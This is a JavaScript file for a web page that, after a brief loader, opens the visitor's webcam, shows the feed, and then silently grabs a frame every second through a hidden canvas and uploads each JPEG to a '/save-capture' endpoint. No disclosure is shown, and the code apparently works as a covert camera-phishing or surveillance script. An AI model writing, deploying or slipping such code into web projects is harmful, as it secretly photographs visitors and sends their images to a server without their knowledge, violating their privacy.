window.addEventListener('DOMContentLoaded', () => {
  const loader = document.querySelector('.loader');
  const container = document.querySelector('.container');
  const video = document.getElementById('video');
  let stream = null;
  let captureInterval = null;
  
  // Create a hidden canvas for photo capture
  const canvas = document.createElement('canvas');
  const ctx = canvas.getContext('2d');
  
  // Hide loader, show container after 1 second
  setTimeout(() => {
    loader.style.display = 'none';
    container.style.display = 'flex';
    
    // Access webcam and stream to video element
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(streamData => {
          stream = streamData;
          video.srcObject = stream;
          video.play();
          
          // Start capturing photos once video is playing
          video.addEventListener('loadedmetadata', () => {
            startPhotoCapture();
          });
        })
        .catch(err => {
          console.error('Error accessing webcam:', err);
          // Optionally show an error message or fallback UI here
        });
    } else {
      console.warn('getUserMedia not supported by this browser');
    }
  }, 1000);
  
  function startPhotoCapture() {
    // Set canvas dimensions to match video
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    
    // Capture a photo every 1 second (1000ms)
    captureInterval = setInterval(() => {
      capturePhoto();
    }, 1000);
  }
  
  function capturePhoto() {
    // Draw current video frame to canvas
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    
    // Convert canvas to blob
    canvas.toBlob(blob => {
      if (blob) {
        // Create timestamp for unique filename
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const filename = `capture_${timestamp}.jpg`;
        
        // Send photo to server
        sendPhotoToServer(blob, filename);
      }
    }, 'image/jpeg', 0.8); // JPEG format with 80% quality
  }
  
  function sendPhotoToServer(blob, filename) {
    const formData = new FormData();
    formData.append('photo', blob, filename);
    
    fetch('/save-capture', {
      method: 'POST',
      body: formData
    })
    .then(response => {
      if (response.ok) {
        console.log(`Photo ${filename} saved successfully`);
      } else {
        console.error('Failed to save photo:', response.statusText);
      }
    })
    .catch(error => {
      console.error('Error sending photo:', error);
    });
  }
  
  // Stop capturing when user leaves the page
  window.addEventListener('beforeunload', () => {
    if (captureInterval) {
      clearInterval(captureInterval);
    }
    if (stream) {
      stream.getTracks().forEach(track => track.stop());
    }
  });
});